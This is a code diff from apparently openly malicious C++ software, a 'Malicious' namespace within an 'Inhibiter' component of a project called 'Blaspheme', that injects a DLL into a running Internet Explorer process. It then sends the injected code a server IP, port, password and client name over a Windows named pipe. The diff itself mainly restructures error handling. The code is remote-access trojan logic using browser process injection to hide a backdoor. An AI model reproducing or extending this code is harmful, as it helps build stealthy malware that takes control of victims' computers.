@@ -106,47 +106,47 @@ namespace Inhibiter
 
 		Malicious::InternetExplorer ie;
 		LOG << "Injecting IE with PID : " + toString(ie.getPid());
-
-		if(!Malicious::inject(ie.getPid(), dll_path))
-        {
-            LOG << "Injection failed, killing IE";
-			ie.kill();
-        }
-        else
-        {
+		try
+		{
+			Malicious::inject(ie.getPid(), dll_path);
 			/*
-            string name_str;
-            string ip_str;
-            string password_str;
-            string port_str;
+			string name_str;
+			string ip_str;
+			string password_str;
+			string port_str;
 
-            buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
-            std::string info_buffer = buffer;
-            istringstream iss(buffer);
-            std::getline( iss, ip_str, SEPERATOR );
-            std::getline( iss, port_str, SEPERATOR );
-            std::getline( iss, name_str, SEPERATOR );
-            std::getline( iss, password_str, SEPERATOR );
+			buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
+			std::string info_buffer = buffer;
+			istringstream iss(buffer);
+			std::getline( iss, ip_str, SEPERATOR );
+			std::getline( iss, port_str, SEPERATOR );
+			std::getline( iss, name_str, SEPERATOR );
+			std::getline( iss, password_str, SEPERATOR );
 
-            LOG << "NAME : " + name_str;
+			LOG << "NAME : " + name_str;
 			LOG << "IP : " + ip_str;
 			LOG << "PORT : " + port_str;
 			LOG << "PASSWORD : " + password_str;
 			*/
-            // la dll est injectée, il faut maintenant lui envoyer l'ip, le port, le mot de passe et le nom du client
-            // pour ce faire, on utilise les "pipe" à la windows (IPC)
-            Network::Pipe pipe_server;
+			// la dll est injectée, il faut maintenant lui envoyer l'ip, le port, le mot de passe et le nom du client
+			// pour ce faire, on utilise les "pipe" à la windows (IPC)
+			Network::Pipe pipe_server;
 
-            pipe_server.listen(PIPE_NAME);
-            LOG << "Pipe server waiting for connection";
-            if(pipe_server.accept())
-            {
-                LOG << "Sending connection informations : "+string(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
-                //pipe_server.send(buffer.c_str(), buffer.size());
-				pipe_server.send(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
-            }
-            pipe_server.disconnect();
-        }
+			pipe_server.listen(PIPE_NAME);
+			LOG << "Pipe server waiting for connection";
+			if(pipe_server.accept())
+			{
+					LOG << "Sending connection informations : "+string(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+					//pipe_server.send(buffer.c_str(), buffer.size());
+					pipe_server.send(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+			}
+			pipe_server.disconnect();
+		}
+		catch(...)
+		{
+			ie.kill();
+			throw;
+		}
     }
 
-} /* Inhibiter */
+} // Inhibiter
